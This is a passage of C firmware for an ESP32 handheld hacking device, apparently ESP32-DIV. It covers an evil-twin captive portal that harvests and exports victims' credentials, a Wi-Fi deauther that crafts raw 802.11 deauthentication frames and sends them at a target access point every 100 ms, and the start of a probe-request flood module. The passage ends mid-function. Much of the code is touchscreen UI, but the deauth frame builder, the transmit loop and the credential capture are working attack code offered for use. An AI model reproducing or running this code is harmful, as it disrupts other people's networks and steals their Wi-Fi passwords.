  CaptivePortal_cpStopDeauth();
  esp_wifi_set_promiscuous(false);
}

static void CaptivePortal_cportalHandleMainNavButtons(void) {
  if (CaptivePortal_currentScreen != CaptivePortal_MAIN_MENU ||
      CaptivePortal_s_cloneUiActive) {
    return;
  }
  const uint32_t now = sys_monotonic_ms();
  if (now - CaptivePortal_cportalLastBtnMs < CaptivePortal_cportalDebounceMs) {
    return;
  }

  if (isButtonPressedEdge(BTN_LEFT)) {
    CaptivePortal_cpEditSsid();
    CaptivePortal_cportalLastBtnMs = now;
    CaptivePortal_cportalWaitButtonRelease(BTN_LEFT);
    return;
  }
  if (isButtonPressedEdge(BTN_DOWN)) {
    CaptivePortal_currentScreen = CaptivePortal_CRED_LIST;
    CaptivePortal_credPage = 0;
    CaptivePortal_drawCredList();
    CaptivePortal_cportalLastBtnMs = now;
    CaptivePortal_cportalWaitButtonRelease(BTN_DOWN);
    return;
  }
  if (isButtonPressedEdge(BTN_UP)) {
    if (CaptivePortal_attackActive) {
      CaptivePortal_stopAttack();
    } else {
      CaptivePortal_startAttack();
    }
    CaptivePortal_cportalLastBtnMs = now;
    CaptivePortal_cportalWaitButtonRelease(BTN_UP);
    return;
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    CaptivePortal_cpCloneExistingAPFlow();
    CaptivePortal_cportalLastBtnMs = now;
    CaptivePortal_cportalWaitButtonRelease(BTN_RIGHT);
  }
}

static void CaptivePortal_cportalHandleCredNavButtons(void) {
  if (CaptivePortal_currentScreen != CaptivePortal_CRED_LIST) {
    return;
  }
  const uint32_t now = sys_monotonic_ms();
  if (now - CaptivePortal_cportalLastBtnMs < CaptivePortal_cportalDebounceMs) {
    return;
  }
  const int count = nv_count("portal");

  const bool hasPrev = CaptivePortal_credPage > 0;
  const bool hasNext =
      count > (CaptivePortal_credPage + 1) * CaptivePortal_kCredRowsPerPage;

  if (isButtonPressedEdge(BTN_LEFT)) {
    CaptivePortal_currentScreen = CaptivePortal_MAIN_MENU;
    CaptivePortal_drawMainMenu();
    CaptivePortal_cportalLastBtnMs = now;
    CaptivePortal_cportalWaitButtonRelease(BTN_LEFT);
    return;
  }
  if (isButtonPressedEdge(BTN_DOWN)) {
    CaptivePortal_clearAllCredentials();
    CaptivePortal_credPage = 0;
    CaptivePortal_drawCredList();
    CaptivePortal_cportalLastBtnMs = now;
    CaptivePortal_cportalWaitButtonRelease(BTN_DOWN);
    return;
  }
  if (isButtonPressedEdge(BTN_UP)) {
    int dumped = 0;
    if (CaptivePortal_cpDumpAllCredentialsToSD(&dumped)) {
      char status[96];
      snprintf(status, sizeof(status),
               "Exported %d -> SD:/captive_portal/eeprom_dump.csv", dumped);
      CaptivePortal_cpCredListStatus(TEXT(status), UI_OK);
    } else {
      CaptivePortal_cpCredListStatus(TEXT("Export failed: SD not ready"),
                                     UI_WARN);
    }
    CaptivePortal_cportalLastBtnMs = now;
    CaptivePortal_cportalWaitButtonRelease(BTN_UP);
    return;
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    if (hasNext) {
      CaptivePortal_credPage++;
      CaptivePortal_drawCredList();
    } else if (hasPrev) {
      CaptivePortal_credPage--;
      CaptivePortal_drawCredList();
    }
    CaptivePortal_cportalLastBtnMs = now;
    CaptivePortal_cportalWaitButtonRelease(BTN_RIGHT);
  }
}

void CaptivePortal_cportalSetup(void) {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  CaptivePortal_cportalUpdateNavLabels();
  featureClearContent(TFT_BLACK);

  CaptivePortal_uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, false);
  redrawTouchButtonBar();
  CaptivePortal_runUI();

  int count = nv_count("portal");
  if (count > MAX_CREDS || count < 0) {
    div_console_line(TEXT("Invalid credential count, resetting to 0"));
    NV_PUT("portal", "count", 0);
  }
  CaptivePortal_loadSSID();

  CaptivePortal_startAttack();

  CaptivePortal_drawMainMenu();
  setupTouchscreen();
  CaptivePortal_cportalUpdateNavLabels();
  redrawTouchButtonBar();
}

void CaptivePortal_cportalLoop(void) {
  captive_dns_poll(&(CaptivePortal_cp_dns));
  if (feature_active &&
      (feature_exit_requested || isButtonPressed(BTN_SELECT) ||
       featureExitButtonPressed())) {
    CaptivePortal_cportalTeardown();
    feature_exit_requested = true;
    return;
  }

  maintainTouchNavBar();
  display_draw_fast_h_line(&(tft), 0, 19, display_width(&(tft)), UI_LINE);

  CaptivePortal_cportalHandleMainNavButtons();
  CaptivePortal_cportalHandleCredNavButtons();
  updateStatusBar();
  CaptivePortal_runUI();

  if (CaptivePortal_attackActive) {
    unsigned long now = sys_monotonic_ms();
    if (CaptivePortal_cp_deauth_active &&
        now - CaptivePortal_cp_last_deauth_time >= 50) {
      CaptivePortal_cpSendDeauthFrame();
      CaptivePortal_cp_last_deauth_time = now;
    }
  }
}

#define SCREEN_WIDTH TFT_WIDTH
#undef SCREEN_HEIGHT
#define SCREEN_HEIGHT TFT_HEIGHT

static unsigned long Deauther_deautherLastButtonPress = 0;
static const unsigned long Deauther_deautherDebounceTime = 200;

// Larger row height = easier touch selection.
enum { Deauther_LIST_HEADER_Y = 50 };
enum { Deauther_LIST_FIRST_ROW_Y = Deauther_LIST_HEADER_Y + 20 };
enum { Deauther_LIST_ROW_H = 22 };

static int Deauther_deautherNetworksPerPage(void) {
  return DIV_MAX(
      1, (wifiListBottomY() - Deauther_LIST_FIRST_ROW_Y) / Deauther_LIST_ROW_H);
}

static void Deauther_deautherUpdateNavLabels(bool onAttackScreen);
void Deauther_drawScanScreen(void);
void Deauther_drawAttackScreen(void);

uint8_t Deauther_deauth_frame_default[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0x00, 0x00, 0x01, 0x00};
uint8_t Deauther_deauth_frame[sizeof(Deauther_deauth_frame_default)];

uint32_t Deauther_packet_count = 0;
uint32_t Deauther_success_count = 0;
uint32_t Deauther_consecutive_failures = 0;
bool Deauther_attack_running = false;
wifi_ap_record_t Deauther_selectedAp;
uint8_t Deauther_selectedChannel;
int Deauther_selected_ap_index = -1;
int Deauther_network_count = 0;
wifi_ap_record_t* Deauther_ap_list = NULL;
bool Deauther_scanning = false;
uint32_t Deauther_last_packet_time = 0;
int Deauther_current_page = 0;
int Deauther_currentIndex = 0;

static void Deauther_deautherUpdateNavLabels(bool onAttackScreen) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  if (onAttackScreen) {
    setTouchNavLabels(Deauther_attack_running ? "Stop" : "Start", NULL, "Exit",
                      NULL, "Back");
  } else {
    setTouchNavLabels("Rescan", "Next", "Exit", "Prev", "View");
  }
  redrawTouchButtonBar();
}

static void Deauther_deautherDrawApRow(int i, int y, bool isSel) {
  char buf[64];
  char ssid[16];
  strncpy(ssid, (char*)Deauther_ap_list[i].ssid, 11);
  ssid[11] = '\0';
  if (strlen((char*)Deauther_ap_list[i].ssid) > 11) {
    strcat(ssid, "...");
  }
  const char* enc =
      Deauther_ap_list[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
  snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid,
           Deauther_ap_list[i].rssi, Deauther_ap_list[i].primary, enc);

  display_fill_rect(&(tft), 0, y, SCREEN_WIDTH, Deauther_LIST_ROW_H, TFT_BLACK);
  display_set_cursor(&(tft), 2, y);
  display_set_text_color_2(&(tft), isSel ? ORANGE : WHITE, TFT_BLACK);
  display_print(&(tft), (TEXT(isSel ? ">" : " ")).data);
  display_set_cursor(&(tft), 10, y);
  display_set_text_color_2(
      &(tft),
      isSel ? ORANGE
            : (Deauther_ap_list[i].authmode == WIFI_AUTH_OPEN ? ORANGE : WHITE),
      TFT_BLACK);
  display_print_line_cstr(&(tft), (TEXT(buf)).data);
}

static void Deauther_deautherOpenTarget(int index) {
  if (index < 0 || index >= Deauther_network_count) {
    return;
  }
  Deauther_currentIndex = index;
  Deauther_selected_ap_index = index;
  Deauther_selectedAp = Deauther_ap_list[index];
  Deauther_selectedChannel = Deauther_ap_list[index].primary;
  Deauther_drawAttackScreen();
}

esp_err_t Deauther_sendRawFrame(const uint8_t* frame_buffer, int size) {
  esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
  Deauther_packet_count++;
  if (res == ESP_OK) {
    Deauther_success_count++;
    Deauther_consecutive_failures = 0;
  } else {
    Deauther_consecutive_failures++;
    if (Deauther_consecutive_failures == 1)
      ESP_LOGW("raw_tx", "TX rejected: %s", esp_err_to_name(res));
  }
  return res;
}

void Deauther_sendDeauthFrame(const wifi_ap_record_t* ap_record, uint8_t chan) {
  esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
  memcpy(Deauther_deauth_frame, Deauther_deauth_frame_default,
         sizeof(Deauther_deauth_frame_default));
  memcpy(&Deauther_deauth_frame[10], ap_record->bssid, 6);
  memcpy(&Deauther_deauth_frame[16], ap_record->bssid, 6);
  Deauther_deauth_frame[24] = 7;
  Deauther_deauth_frame[25] = 0;

  Deauther_sendRawFrame(Deauther_deauth_frame, sizeof(Deauther_deauth_frame));
}

int Deauther_compare_ap(const void* a, const void* b) {
  wifi_ap_record_t* ap1 = (wifi_ap_record_t*)a;
  wifi_ap_record_t* ap2 = (wifi_ap_record_t*)b;
  return ap2->rssi - ap1->rssi;
}

void Deauther_drawButton(int x, int y, int w, int h, const char* label,
                         bool highlight, bool disabled) {
  FeatureUI_ButtonStyle style = highlight ? FeatureUI_ButtonStyle_Primary
                                          : FeatureUI_ButtonStyle_Secondary;
  FeatureUI_drawButtonRect(x, y, w, h, label, style, false, disabled, 1);
}

void Deauther_drawTabBar(const char* leftButton, bool leftDisabled,
                         const char* prevButton, bool prevDisabled,
                         const char* nextButton, bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    Deauther_deautherUpdateNavLabels(Deauther_selected_ap_index >= 0);
    return;
  }

  display_fill_rect(&(tft), 0, 304, SCREEN_WIDTH, 16, FEATURE_BG);

  if (leftButton && leftButton[0]) {
    Deauther_drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
  }

  if (prevButton && prevButton[0]) {
    Deauther_drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
  }
  if (nextButton && nextButton[0]) {
    Deauther_drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
  }
}

void Deauther_drawScanScreen(void) {
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  wifiClearBody(TFT_BLACK);
  display_set_text_size(&(tft), 1);

  if (Deauther_scanning) {
    display_set_cursor(&(tft), 10, 50);
    display_set_text_color_1(&(tft), GREEN);
    display_print_line_cstr(&(tft), "Scanning.");
    loading(100, ORANGE, 0, 0, 3, true);
    display_set_cursor(&(tft), 10, 65);
    display_print_line_cstr(&(tft), "Wait a moment.");
    return;
  }

  if (Deauther_network_count == 0) {
    display_set_text_color_1(&(tft), GREEN);
    display_set_cursor(&(tft), 10, 50);
    display_print_line_cstr(&(tft), "No networks found.");
    display_set_cursor(&(tft), 10, 65);
    display_print_line_cstr(&(tft), "Press Rescan.");
  } else {
    const int perPage = Deauther_deautherNetworksPerPage();
    if (Deauther_currentIndex < 0) {
      Deauther_currentIndex = 0;
    }
    if (Deauther_currentIndex >= Deauther_network_count) {
      Deauther_currentIndex = DIV_MAX(0, Deauther_network_count - 1);
    }
    Deauther_current_page = Deauther_currentIndex / DIV_MAX(1, perPage);

    display_set_text_color_1(&(tft), GREEN);
    display_set_cursor(&(tft), 10, Deauther_LIST_HEADER_Y);
    display_print_line_cstr(&(tft), "Networks:");

    char page_buf[32];
    snprintf(page_buf, sizeof(page_buf), "Page %lu/%lu",
             (unsigned long)(Deauther_current_page + 1),
             (unsigned long)DIV_MAX(
                 1, (Deauther_network_count + perPage - 1) / perPage));
    display_set_cursor(&(tft), 180, Deauther_LIST_HEADER_Y);
    display_set_text_color_1(&(tft), GREEN);
    display_print_line_cstr(&(tft), (TEXT(page_buf)).data);

    int y = Deauther_LIST_FIRST_ROW_Y;
    const int start_index = Deauther_current_page * perPage;
    const int end_index =
        DIV_MIN(start_index + perPage, Deauther_network_count);
    for (int i = start_index; i < end_index && y < wifiListBottomY(); i++) {
      Deauther_deautherDrawApRow(i, y, i == Deauther_currentIndex);
      y += Deauther_LIST_ROW_H;
    }
  }

  Deauther_drawTabBar("Rescan", false, "Prev", Deauther_currentIndex <= 0,
                      "Next",
                      Deauther_currentIndex >= Deauther_network_count - 1);
}

bool Deauther_scanNetworks(void) {
  Deauther_scanning = true;
  Deauther_current_page = 0;
  Deauther_currentIndex = 0;
  Deauther_drawScanScreen();

  Deauther_network_count = WifiScan_staWifiScanSync();
  if (Deauther_network_count <= 0) {
    Deauther_scanning = false;
    return false;
  }

  if (Deauther_ap_list) free(Deauther_ap_list);
  Deauther_ap_list = (wifi_ap_record_t*)malloc(Deauther_network_count *
                                               sizeof(wifi_ap_record_t));
  if (!Deauther_ap_list) {
    Deauther_scanning = false;
    return false;
  }

  for (int i = 0; i < Deauther_network_count; i++) {
    wifi_ap_record_t ap_record = {0};
    memcpy(ap_record.bssid, network_bssid(i), 6);
    strncpy((char*)ap_record.ssid, (network_ssid(i)).data,
            sizeof(ap_record.ssid));
    ap_record.rssi = network_rssi(i);
    ap_record.primary = network_channel(i);
    ap_record.authmode = network_auth_mode(i);
    Deauther_ap_list[i] = ap_record;
  }

  qsort(Deauther_ap_list, Deauther_network_count, sizeof(wifi_ap_record_t),
        Deauther_compare_ap);

  Deauther_scanning = false;
  return true;
}

bool Deauther_checkApChannel(const uint8_t* bssid, uint8_t* channel) {
  const int n = WifiScan_staWifiScanSync();
  for (int i = 0; i < n; i++) {
    if (memcmp(network_bssid(i), bssid, 6) == 0) {
      *channel = network_channel(i);
      network_set_mode(WIFI_MODE_AP);
      sys_sleep_ms(100);
      return true;
    }
  }

  network_set_mode(WIFI_MODE_AP);
  sys_sleep_ms(100);
  return false;
}

void Deauther_resetWifi(void) {
  esp_wifi_stop();
  sys_sleep_ms(200);
  esp_wifi_start();
  sys_sleep_ms(200);
  Deauther_packet_count = 0;
  Deauther_success_count = 0;
  Deauther_consecutive_failures = 0;
}

void Deauther_drawAttackScreen(void) {
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  wifiClearBody(TFT_BLACK);
  display_set_text_size(&(tft), 1);

  char buf[64];
  display_set_text_color_1(&(tft), WHITE);
  snprintf(buf, sizeof(buf), "Target: %s", Deauther_selectedAp.ssid);
  display_set_cursor(&(tft), 10, 50);
  display_print_line_cstr(&(tft), (TEXT(buf)).data);

  snprintf(buf, sizeof(buf), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
           Deauther_selectedAp.bssid[0], Deauther_selectedAp.bssid[1],
           Deauther_selectedAp.bssid[2], Deauther_selectedAp.bssid[3],
           Deauther_selectedAp.bssid[4], Deauther_selectedAp.bssid[5]);
  display_set_cursor(&(tft), 10, 70);
  display_print_line_cstr(&(tft), (TEXT(buf)).data);

  const char* auth;
  switch (Deauther_selectedAp.authmode) {
    case WIFI_AUTH_OPEN:
      auth = "OPEN";
      break;
    case WIFI_AUTH_WPA_PSK:
      auth = "WPA-PSK";
      break;
    case WIFI_AUTH_WPA2_PSK:
      auth = "WPA2-PSK";
      break;
    case WIFI_AUTH_WPA_WPA2_PSK:
      auth = "WPA/WPA2-PSK";
      break;
    default:
      auth = "Unknown";
      break;
  }
  snprintf(buf, sizeof(buf), "Auth: %s", auth);
  display_set_cursor(&(tft), 10, 85);
  display_print_line_cstr(&(tft), (TEXT(buf)).data);

  display_set_cursor(&(tft), 10, 100);
  display_set_text_color_1(&(tft),
                           Deauther_attack_running ? ORANGE : UI_DIM_TEXT);
  display_print_line_cstr(
      &(tft),
      (TEXT(Deauther_attack_running ? "Status: Running" : "Status: Stopped"))
          .data);

  snprintf(buf, sizeof(buf), "Packets: %lu",
           (unsigned long)Deauther_packet_count);
  display_set_cursor(&(tft), 10, 115);
  display_set_text_color_1(&(tft), WHITE);
  display_print_line_cstr(&(tft), (TEXT(buf)).data);

  float success_rate =
      (Deauther_packet_count > 0)
          ? (float)Deauther_success_count / Deauther_packet_count * 100
          : 0;
  snprintf(buf, sizeof(buf), "Success: %.2f%%", success_rate);
  display_set_cursor(&(tft), 10, 130);
  display_print_line_cstr(&(tft), (TEXT(buf)).data);

  snprintf(buf, sizeof(buf), "Heap: %lu",
           (unsigned long)esp_get_free_heap_size());
  display_set_cursor(&(tft), 10, 145);
  display_print_line_cstr(&(tft), (TEXT(buf)).data);

  const char* buttons[] = {Deauther_attack_running ? "Stop" : "Start", "Back"};
  Deauther_drawTabBar(buttons[0], false, "", true, buttons[1], false);
}

static void Deauther_deautherHandleNavButtons(void) {
  const unsigned long now = sys_monotonic_ms();
  if (now - Deauther_deautherLastButtonPress < Deauther_deautherDebounceTime) {
    return;
  }

  if (Deauther_selected_ap_index >= 0) {
    if (isButtonPressed(BTN_LEFT)) {
      Deauther_attack_running = !Deauther_attack_running;
      if (!Deauther_attack_running) {
        Deauther_last_packet_time = 0;
      }
      Deauther_drawAttackScreen();
      Deauther_deautherLastButtonPress = now;
      sys_sleep_ms(200);
      return;
    }
    if (isButtonPressed(BTN_RIGHT)) {
      Deauther_attack_running = false;
      Deauther_last_packet_time = 0;
      Deauther_selected_ap_index = -1;
      Deauther_drawScanScreen();
      Deauther_deautherLastButtonPress = now;
      sys_sleep_ms(200);
      return;
    }
    return;
  }

  if (Deauther_scanning) {
    return;
  }

  if (isButtonPressed(BTN_LEFT)) {
    if (Deauther_scanNetworks()) {
      Deauther_drawScanScreen();
    }
    Deauther_deautherLastButtonPress = now;
    sys_sleep_ms(200);
    return;
  }
  if (isButtonPressed(BTN_UP) && Deauther_currentIndex > 0) {
    Deauther_currentIndex--;
    Deauther_drawScanScreen();
    Deauther_deautherLastButtonPress = now;
    sys_sleep_ms(200);
    return;
  }
  if (isButtonPressed(BTN_DOWN) &&
      Deauther_currentIndex < Deauther_network_count - 1) {
    Deauther_currentIndex++;
    Deauther_drawScanScreen();
    Deauther_deautherLastButtonPress = now;
    sys_sleep_ms(200);
    return;
  }
  if (isButtonPressed(BTN_RIGHT) && Deauther_network_count > 0) {
    Deauther_deautherOpenTarget(Deauther_currentIndex);
    Deauther_deautherLastButtonPress = now;
    sys_sleep_ms(200);
  }
}

void Deauther_handleTouch(void) {
  int x, y;
  if (!readTouchXY(&(x), &(y))) return;

  bool redraw = false;
  if (Deauther_selected_ap_index == -1) {
    const int listMaxY =
        Deauther_LIST_FIRST_ROW_Y +
        (Deauther_deautherNetworksPerPage() * Deauther_LIST_ROW_H);
    if (!Deauther_scanning && y >= Deauther_LIST_FIRST_ROW_Y && y < listMaxY &&
        Deauther_network_count > 0) {
      int index = (y - Deauther_LIST_FIRST_ROW_Y) / Deauther_LIST_ROW_H +
                  (Deauther_current_page * Deauther_deautherNetworksPerPage());
      if (index >= 0 && index < Deauther_network_count) {
        Deauther_deautherOpenTarget(index);
        sys_sleep_ms(50);
      }
    } else if (!featureHasTouchNavBar() && !Deauther_scanning && y >= 290 &&
               y <= 320) {
      if (x >= 0 && x <= 57) {
        Deauther_drawButton(0, 304, 57, 16, "Rescan", true, false);
        sys_sleep_ms(50);
        if (Deauther_scanNetworks()) {
          Deauther_drawScanScreen();
        }
        redraw = true;
      } else if (x >= 122 && x <= 179 && Deauther_currentIndex > 0) {
        Deauther_drawButton(117, 304, 57, 16, "Prev", true, false);
        Deauther_currentIndex--;
        Deauther_drawScanScreen();
        sys_sleep_ms(50);
        redraw = true;
      } else if (x >= 183 && x <= 240 &&
                 Deauther_currentIndex < Deauther_network_count - 1) {
        Deauther_drawButton(178, 304, 57, 16, "Next", true, false);
        Deauther_currentIndex++;
        Deauther_drawScanScreen();
        sys_sleep_ms(50);
        redraw = true;
      }
    }
  } else {
    if (!featureHasTouchNavBar() && y >= 290 && y <= 320) {
      if (x >= 0 && x <= 57) {
        Deauther_drawButton(0, 304, 57, 16,
                            Deauther_attack_running ? "Stop" : "Start", true,
                            false);
        Deauther_attack_running = !Deauther_attack_running;
        if (!Deauther_attack_running) {
          Deauther_last_packet_time = 0;
        }
        Deauther_drawAttackScreen();
        sys_sleep_ms(50);
        redraw = true;
      } else if (x >= 183 && x <= 240) {
        Deauther_drawButton(177, 304, 57, 16, "Back", true, false);
        Deauther_attack_running = false;
        Deauther_last_packet_time = 0;
        Deauther_selected_ap_index = -1;
        Deauther_drawScanScreen();
        sys_sleep_ms(50);
        redraw = true;
      }
    }
  }

  if (redraw) {
    sys_sleep_ms(100);
  }
}

static bool Deauther_uiDrawn = false;

void Deauther_runUI(void) {
#define SCREEN_WIDTH TFT_WIDTH
#define SCREENHEIGHT TFT_HEIGHT
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 2

  static int iconX[ICON_NUM] = {220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {bitmap_icon_undo,
                                                 bitmap_icon_go_back};

  if (!Deauther_uiDrawn) {
    display_fill_rect(&(tft), 0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH,
                      STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], ICON_SIZE,
                            ICON_SIZE, TFT_WHITE);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    Deauther_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (sys_monotonic_ms() - lastAnimationTime >= 150) {
        display_draw_bitmap(&(tft), iconX[activeIcon], iconY, icons[activeIcon],
                            ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = sys_monotonic_ms();
      }
      break;

    case 2:
      if (sys_monotonic_ms() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = sys_monotonic_ms();
      }
      break;

    case 3:
      switch (activeIcon) {
        case 0:
          Deauther_scanNetworks();
          sys_sleep_ms(50);
          if (Deauther_scanNetworks()) {
            Deauther_drawScanScreen();
          }
          animationState = 0;
          activeIcon = -1;
          break;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (sys_monotonic_ms() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 1) {
                feature_exit_requested = true;
              } else {
                display_draw_bitmap(&(tft), iconX[i], iconY, icons[i],
                                    ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = sys_monotonic_ms();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

void Deauther_deautherSetup(void) {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  Deauther_deautherUpdateNavLabels(false);
  featureClearContent(TFT_BLACK);

  setupTouchscreen();
  Deauther_uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, false);
  redrawTouchButtonBar();
  Deauther_runUI();

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);

  display_set_text_color_2(&(tft), GREEN, BLACK);
  display_set_text_size(&(tft), 1);
  display_set_cursor(&(tft), 10, 50);
  display_print_line_cstr(&(tft), "Initializing...");

  Deauther_attack_running = false;
  Deauther_selected_ap_index = -1;
  Deauther_current_page = 0;
  Deauther_currentIndex = 0;
  Deauther_scanning = false;

  if (!WifiScan_loadApListFromWifiCache(
          &Deauther_ap_list, &Deauther_network_count, Deauther_compare_ap)) {
    Deauther_scanNetworks();
  }

  Deauther_drawScanScreen();

  Deauther_drawScanScreen();
  redrawTouchButtonBar();
}

void Deauther_deautherLoop(void) {
  if (feature_active &&
      (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
    feature_exit_requested = true;
    return;
  }

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);

  Deauther_deautherHandleNavButtons();
  Deauther_handleTouch();
  updateStatusBar();
  Deauther_runUI();

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);

  uint32_t current_time = sys_monotonic_ms();
  if (Deauther_attack_running && Deauther_selected_ap_index != -1) {
    uint32_t heap = esp_get_free_heap_size();
    if (heap < 80000) {
      Deauther_attack_running = false;
      Deauther_last_packet_time = 0;
      Deauther_drawAttackScreen();
      sys_sleep_ms(3000);
      return;
    }

    if (Deauther_consecutive_failures > 10) {
      Deauther_resetWifi();
      Deauther_last_packet_time = 0;
      sys_sleep_ms(3000);
      return;
    }

    if (current_time - Deauther_last_packet_time >= 100 &&
        Deauther_attack_running) {
      Deauther_sendDeauthFrame(&Deauther_selectedAp, Deauther_selectedChannel);
      Deauther_last_packet_time = current_time;
    }
  }

  static uint32_t last_channel_check = 0;
  if (Deauther_attack_running && current_time - last_channel_check > 15000) {
    uint8_t new_channel;
    if (Deauther_checkApChannel(Deauther_selectedAp.bssid, &new_channel)) {
      if (new_channel != Deauther_selectedChannel) {
        Deauther_selectedChannel = new_channel;
        wifi_config_t ap_config = {0};
        strncpy((char*)ap_config.ap.ssid, "ESP32-DIV",
                sizeof(ap_config.ap.ssid));
        ap_config.ap.ssid_len = strlen("ESP32-DIV");
        strncpy((char*)ap_config.ap.password, "deauth123",
                sizeof(ap_config.ap.password));
        ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
        ap_config.ap.ssid_hidden = 0;
        ap_config.ap.max_connection = 4;
        ap_config.ap.beacon_interval = 100;
        ap_config.ap.channel = Deauther_selectedChannel;
        ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
      }
    }
    last_channel_check = current_time;
  }

  static uint32_t last_status_time = 0;
  if (Deauther_attack_running && current_time - last_status_time > 2000) {
    Deauther_drawAttackScreen();
    last_status_time = current_time;
  }
}

#define SCREEN_WIDTH TFT_WIDTH
#undef SCREEN_HEIGHT
#define SCREEN_HEIGHT TFT_HEIGHT

// Larger row height = easier touch selection.
enum { ProbeRequestFlood_LIST_HEADER_Y = 50 };
enum {
  ProbeRequestFlood_LIST_FIRST_ROW_Y = ProbeRequestFlood_LIST_HEADER_Y + 20
};
enum { ProbeRequestFlood_LIST_ROW_H = 22 };

static unsigned long ProbeRequestFlood_probeLastButtonPress = 0;
static const unsigned long ProbeRequestFlood_probeDebounceTime = 200;

static int ProbeRequestFlood_probeNetworksPerPage(void) {
  return DIV_MAX(1, (wifiListBottomY() - ProbeRequestFlood_LIST_FIRST_ROW_Y) /
                        ProbeRequestFlood_LIST_ROW_H);
}

static void ProbeRequestFlood_probeUpdateNavLabels(bool onAttackScreen);
void ProbeRequestFlood_drawScanScreen(void);
void ProbeRequestFlood_drawAttackScreen(void);

static uint8_t ProbeRequestFlood_probe_frame[128];
static const uint8_t ProbeRequestFlood_probe_rates[8] = {
    0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};

uint32_t ProbeRequestFlood_packet_count = 0;
uint32_t ProbeRequestFlood_success_count = 0;
uint32_t ProbeRequestFlood_consecutive_failures = 0;
bool ProbeRequestFlood_attack_running = false;
wifi_ap_record_t ProbeRequestFlood_selectedAp;
uint8_t ProbeRequestFlood_selectedChannel;
int ProbeRequestFlood_selected_ap_index = -1;
int ProbeRequestFlood_network_count = 0;
wifi_ap_record_t* ProbeRequestFlood_ap_list = NULL;
bool ProbeRequestFlood_scanning = false;
uint32_t ProbeRequestFlood_last_packet_time = 0;
int ProbeRequestFlood_current_page = 0;
int ProbeRequestFlood_currentIndex = 0;

static void ProbeRequestFlood_probeUpdateNavLabels(bool onAttackScreen) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  if (onAttackScreen) {
    setTouchNavLabels(ProbeRequestFlood_attack_running ? "Stop" : "Start", NULL,
                      "Exit", NULL, "Back");
  } else {
    setTouchNavLabels("Rescan", "Next", "Exit", "Prev", "View");
  }
  redrawTouchButtonBar();
}

static void ProbeRequestFlood_probeDrawApRow(int i, int y, bool isSel) {
  char buf[64];
  char ssid[16];
  strncpy(ssid, (char*)ProbeRequestFlood_ap_list[i].ssid, 11);
  ssid[11] = '\0';
  if (strlen((char*)ProbeRequestFlood_ap_list[i].ssid) > 11) {
    strcat(ssid, "...");
  }
  const char* enc =
      ProbeRequestFlood_ap_list[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
  snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid,
           ProbeRequestFlood_ap_list[i].rssi,
           ProbeRequestFlood_ap_list[i].primary, enc);

  display_fill_rect(&(tft), 0, y, SCREEN_WIDTH, ProbeRequestFlood_LIST_ROW_H,
                    TFT_BLACK);
  display_set_cursor(&(tft), 2, y);
